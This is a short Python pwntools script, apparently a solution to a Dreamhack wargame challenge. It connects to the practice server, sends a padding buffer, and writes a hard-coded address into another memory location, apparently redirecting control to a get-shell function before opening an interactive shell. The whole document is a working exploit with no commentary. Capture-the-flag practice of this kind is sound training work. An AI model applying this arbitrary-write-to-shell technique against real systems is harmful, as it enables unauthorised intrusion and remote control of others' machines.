from pwn import *

context.log_level = 'debug'

p = remote("host3.dreamhack.games", 15905)

garbage = b'A' * 0x60
overwriteaddr = str(6295584)
getshelladdr = str(4196586)

p.sendline(garbage)

p.recvuntil("Addr : ")
p.sendline(overwriteaddr)
p.recvuntil("Value : ")
p.sendline(getshelladdr)

p.interactive()
